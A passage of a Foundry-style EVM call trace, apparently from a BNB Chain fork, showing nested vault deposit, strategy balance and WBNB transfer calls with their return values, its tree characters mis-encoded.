    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000040b4169b9c66de4279
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3050] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [873] 0x07dE034A0Fc0DA7a0bf703F6DcA7025bcD61BA3e::userInfo(2, 0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 24228113350502997257692 [2.422e22], 7408868011005831571933 [7.408e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000521689db63c86536ddc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000edc4050be30300e366f6a742e9ee7902e72d5d96
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [518508] 0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8::depositFor(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 273813109335418386629 [2.738e20], 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2517] 0x7376fC47863ceeD6bf3427CE4526ae29c4864A7D::bank(0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11852] 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e::beforeDeposit()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2407] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::beforeDeposit()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2452] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::beforeDeposit()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2430] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::beforeDeposit()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [27298] 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11176] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1104] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [364] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2846] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2106] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5640626957589713000405 [5.64e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1285] 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F::userInfo(1, 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 60955393982519636743013 [6.095e22], 2826042283495043367339022 [2.826e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1537] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [794] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000006b2cb86333f170ffe12
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10305] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1173] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [433] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2627] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1887] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [865] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::userInfo(0, 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1193568351189769011833 [1.193e21], 7546058860083590777618 [7.546e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000040b4169b9c66de4279
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3050] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [873] 0x07dE034A0Fc0DA7a0bf703F6DcA7025bcD61BA3e::userInfo(2, 0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 24228113350502997257692 [2.422e22], 7408868011005831571933 [7.408e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000521689db63c86536ddc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000c14e83a85180441ae67
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 9616984803998 [9.616e12]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11748] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8, 273813109335418386629 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, to: 0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8, value: 273813109335418386629 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [378] 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e::investDisabled() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 273813118952403190627 [2.738e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [25162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e, 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8, to: 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e, value: 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [320208] 0x2B4f87D9d0A32A04B2D045fd5927cb57bEdB076e::earn(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 273813118952403190627 [2.738e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11176] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1104] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [364] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2846] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2106] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5640626957589713000405 [5.64e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1285] 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F::userInfo(1, 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 60955393982519636743013 [6.095e22], 2826042283495043367339022 [2.826e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1537] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [794] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000006b2cb86333f170ffe12
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10305] 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1173] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [433] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2627] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1887] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 10909322729467335744224 [1.09e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000024f65441661ab6d1ae0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [865] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::userInfo(0, 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1193568351189769011833 [1.193e21], 7546058860083590777618 [7.546e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000040b4169b9c66de4279
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3050] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [873] 0x07dE034A0Fc0DA7a0bf703F6DcA7025bcD61BA3e::userInfo(2, 0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 24228113350502997257692 [2.422e22], 7408868011005831571933 [7.408e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000521689db63c86536ddc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11176] 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1104] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [364] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 793300839274045174646136 [7.933e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2846] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2106] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 5640626957589713000405 [5.64e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000572d1c8d1e188103eb53
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1285] 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F::userInfo(1, 0xb43410A271C71f2FDA2D1ED9C1165e924Be159D9) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 60955393982519636743013 [6.095e22], 2826042283495043367339022 [2.826e24]
